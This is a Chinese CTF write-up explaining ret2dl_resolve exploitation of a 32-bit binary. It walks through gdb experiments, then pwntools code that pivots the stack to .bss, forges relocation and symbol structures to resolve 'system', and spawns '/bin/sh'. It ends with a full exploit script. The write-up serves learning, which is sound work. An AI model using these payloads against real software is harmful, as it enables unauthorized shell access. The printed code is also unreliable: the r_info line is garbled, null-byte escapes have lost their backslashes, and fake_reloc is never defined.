实际演示：
使用set修改内存中read为alarm
    gdb-peda$ set {char} 0x804829c=0x61
    gdb-peda$ set {char} 0x804829d=0x6c
    gdb-peda$ set {char} 0x804829e=0x61
    gdb-peda$ set {char} 0x804829f=0x72
    gdb-peda$ set {char} 0x80482a0=0x6d
    gdb-peda$ set {char} 0x80482a1=0x00
然后执行程序
发现执行read的时候，程序却执行了alarm
查看read的Got表，发现地址也被重定向为了alarm的地址。
    $ x/xw 0x0804a00c
    0x804a00c:    0xf7ead270
###  思路：
现在我们已经懂得了如何利用控制符号重定位来对函数进行解析。
理论上只需要修改dynstr段的内容就能够控制重定位，但是在程序中，dynstr段是不可写的。
所以直接修改是难以实现的。我们真正能控制的只有reloc_argc.
所以前辈们想出了一个解决方案，便是伪造rel.plt表和symtab表，并且修改reloc_argc，让重定位函数解析我们伪造的结构体，借此修改符号解析的位置。
注意：本题所有的gadget都是在pwn程序中找到的，libc因为版本未知，所以不能够确定。
## 利用脚本
####  Stack pvoit
首先为了栈完全可控，我们选择bss段，作为新的栈段。
下面是代码，利用到stack pviot技术，自定义一块内存区域为新的堆栈。
    from pwn import *
    context.log_level='debug'
    p=process('./pwn')
    elf=ELF('./pwn')
    gdb.attach(p)
    bss_addr=0x0804a040 #objdump -h pwn|grep bss
    read_plt=0x08048390 #objdump -d pwn |grep plt
    gadget1=0x0804852a #ROPgadget --binary pwn |grep leave # leave |ret
    payload='A'*0x28+p32(bss_addr) #EBP->bss_addr
    payload+=p32(read_plt)+p32(gadget1)+p32(0)+p32(bss_addr)+p32(0x36)
    p.sendline(payload)
    #raw_input()
    #p.sendline("a"*0x20)
    p.interactive()
成功修改了栈顶为BSS段的头
    gadget2=0x080485d9 #pop esi | pop edi | pop ebp | ret
    gadget3=0x080485db #pop ebp | ret
    stack_size=0x800
    base_stage=bss_addr+stack_size
    payload1="A"*4 #留给上一个ROP链会执行的leave（pop ebp）的数据
    payload1+=p32(read_plt)+p32(gadget2)+p32(base_stage)+p32(100)
    payload1+=p32(gadget3)+p32(base_stage)
    payload1+=p32(gadget1)
    p.sendline(payload1)
成功将栈顶变为bss_addr 栈底变为base_stage，完成stack pviot
####  构造伪造表
构造时候，需要计算出偏移值，然后再设计栈。这是一个很需要耐心的过程。
希望读者能把下面这段代码好好消化以下，对照上面的重定位表的结构。
    #fake struct
    dynsym=0x080481dc#objdump -h pwn
    dynstr=0x0804827c
    alarm_got=0x0804a010
    fake_sym_addr=base_stage+36
    align=0x10-((fake_sym_addr-dynsym)&0xf) #align=8#栈对齐
    fake_sym_addr=fake_sym_addr+align
    index_dynsym=(fake_sym_addr-dynsym)/0x10 #计算fake_sym和dysym的偏移
    r_info=index_dynsymsystem #将alarm重定位
    st_name=fake_sym_addr+0x10-dynstr #计算fake_dynstr和真实dynstr的偏移
    fake_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12) #根据sym结构体，构造fake_sym
    plt0=0x08048380 #.plt 强制alarm重定位
    rel_plt=0x0804833c #原JMPREL结构位置
    index_offset=(base_stage+28)-rel_plt #计算reloc_arg
    cmd='/bin/sh'
    payload2='B'*4 #EBP
    payload2+=p32(plt0) #程序强制重定位
    payload2+=p32(index_offset) # push reloc_arg
    payload2+='A'*4 #EBP 
    payload2+=p32(base_stage+80) #重定位结束之后，栈顶设置为base_stage+80
    payload2+='A'*8
    #fake_struct
    payload2+=fake_reloc #base_stage+28 #在栈中伪造fake_reloc结构
    payload2+='B'*8
    payload2+=fake_sym #base_stage+36#在栈中伪造fake_sym结构
    payload2+="systemx00" #在栈中伪造 dynstr结构
    payload2+='A'*(80-len(payload2))
    payload2+=cmd+'x00' #重定位结束之后，会自动调用被重定位函数，此时在栈顶存放system的参数
    payload2+='A'*(100-len(payload2))
    print len(payload2)
    p.send(payload2)
经历一个漫长的构造过程，终于成功get shell
####  完整的exp
    from pwn import *
    context.log_level='debug'
    p=process('./pwn')
    #p=remote("c346dfd9093dd09cc714320ffb41ab76.kr-lab.com",56833)
    elf=ELF('./pwn')
    #gdb.attach(p)
    bss_addr=0x0804a040 #objdump -h pwn|grep bss
    read_plt=0x08048390 #objdump -d pwn |grep plt
    gadget1=0x0804852a #ROPgadget --binary pwn |grep leave # leave |ret
    payload='A'*0x28+p32(bss_addr) #EBP->bss_addr
    payload+=p32(read_plt)+p32(gadget1)+p32(0)+p32(bss_addr)+p32(0x36)
    #raw_input()
    p.sendline(payload)
    raw_input()
    #p.sendline("a"*0x20)
    gadget2=0x080485d9 #pop esi | pop edi | pop ebp | ret
    gadget3=0x080485db #pop ebp | ret
    stack_size=0x800
    base_stage=bss_addr+stack_size
    payload1="A"*4
    payload1+=p32(read_plt)+p32(gadget2)+p32(0)+p32(base_stage)+p32(100)
    payload1+=p32(gadget3)+p32(base_stage)
    payload1+=p32(gadget1)
    p.sendline(payload1)
    #fake struct
    dynsym=0x080481dc#objdump -h pwn
    dynstr=0x0804827c
    alarm_got=0x0804a010
    fake_sym_addr=base_stage+36
    align=0x10-((fake_sym_addr-dynsym)&0xf) #align=8
    fake_sym_addr=fake_sym_addr+align
    index_dynsym=(fake_sym_addr-dynsym)/0x10
    r_info=index_dynsymsystem
    st_name=fake_sym_addr+0x10-dynstr
    fake_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12)
    plt0=0x08048380 #.plt
    rel_plt=0x0804833c
    index_offset=(base_stage+28)-rel_plt
    cmd='/bin/sh'
    payload2='B'*4
    payload2+=p32(plt0)
    payload2+=p32(index_offset) # push reloc_arg
    payload2+='A'*4
    payload2+=p32(base_stage+80)
    payload2+='A'*8
    #fake_struct
    payload2+=fake_reloc #base_stage+28
    payload2+='B'*8
    payload2+=fake_sym #base_stage+36
    payload2+="systemx00"
    payload2+='A'*(80-len(payload2))
    payload2+=cmd+'x00'
    payload2+='A'*(100-len(payload2))
    print len(payload2)
    p.send(payload2)
    p.interactive()
###  结束语：
这个技术利用难度非常高，研究了好多天才成功实现。在这个过程中把ELF结构还有重定位的原理全都复习了一遍，这个过程虽然辛苦，但在彻悟之后便会带来一种特殊的喜悦。
通过这道题，还是发现了自己在对ELF方面理解还是不够深，借做这道题的机会好好梳理一下。
文章中如有错误，希望各位大佬，能批评指正。
## 参考文献：